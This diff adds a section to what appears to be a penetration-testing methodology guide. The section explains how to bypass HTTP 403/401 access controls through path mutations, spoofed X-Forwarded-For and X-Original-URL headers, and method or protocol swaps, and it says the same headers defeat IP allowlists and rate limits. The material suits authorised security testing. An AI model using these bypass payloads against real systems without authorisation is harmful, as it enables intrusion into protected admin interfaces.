@@ -252,6 +252,31 @@ probe_endpoint(session, method, path, param,
 get_payloads(category="ssti", context="jinja2")
 ```
 
+## Strategy E: 403 / access-control bypass (blocked path or IP gate)
+
+A `403`/`401` on a path is a filter to defeat, not a dead end. Automate with
+`probe_40x_bypass(url)` / `run_dontgo403` / `run_byp4xx`; the manual axes:
+
+**Path mutation** (front-end proxy ACL ≠ back-end routing):
+```
+/admin      ->  /admin/        /admin//       /admin/.        /./admin
+/%2e/admin      /admin/..;/     /admin..;/     /admin%20       /admin%09
+/admin?      /admin#          /admin/*        /ADMIN          /Admin
+/admin.json     /admin.html     /..%2fadmin    /%2f/admin
+```
+**Header overrides** (make the back-end see a different path/origin):
+```
+X-Original-URL: /admin           X-Rewrite-URL: /admin
+X-Forwarded-For: 127.0.0.1       X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1      X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1     X-Forwarded-Host: localhost
+Referer: <same-host>/admin       Origin: null
+```
+**Method / protocol swap:** GET↔POST↔PUT↔HEAD↔arbitrary verb; try HTTP where HTTPS is enforced (and vice-versa).
+
+The IP-spoof headers above also bypass IP-allowlisted admin panels and rate
+limits — worth a pass on any `403`/`429` that looks IP-based.
+
 ## Phase 3: Incremental Testing
 
 Don't throw complex payloads blindly. Build up incrementally:
